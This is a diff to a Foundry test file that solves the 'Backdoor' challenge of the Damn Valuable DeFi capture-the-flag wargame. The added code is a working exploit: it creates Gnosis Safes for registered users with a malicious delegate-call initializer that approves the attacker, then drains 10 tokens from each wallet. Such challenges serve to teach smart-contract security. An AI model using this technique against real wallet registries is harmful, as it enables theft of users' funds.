@@ -7,7 +7,14 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
+import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
+
+contract AttackersDelegate {
+    function approveDvt(DamnValuableToken dvtToken, address attacker, uint256 amount) external {
+        dvtToken.approve(attacker, amount);
+    }
+}
 
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
@@ -72,8 +79,29 @@ contract Backdoor is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
-        /** EXPLOIT END **/
+        AttackersDelegate attackingDelegate = new AttackersDelegate();
+        for (uint256 i = 0; i < 4; i++) {
+            address eachUser = users[i];
+            address[] memory owners = new address[](1);
+            owners[0] = eachUser;
+            bytes memory initializer = abi.encodeWithSelector(GnosisSafe.setup.selector, 
+                owners,
+                1,
+                address(attackingDelegate),
+                abi.encodeWithSelector(AttackersDelegate.approveDvt.selector, 
+                    dvt,
+                    attacker,
+                    10 ether
+                ),
+                address(0),  // fallbackHandler
+                address(0),
+                0,
+                payable(address(0))
+            );
+            GnosisSafe safeProxy = GnosisSafe(payable(address(walletFactory.createProxyWithCallback(address(masterCopy), initializer, 0, walletRegistry))));
+            vm.prank(attacker);
+            dvt.transferFrom(address(safeProxy), attacker, 10 ether);
+        }
         validation();
     }
 
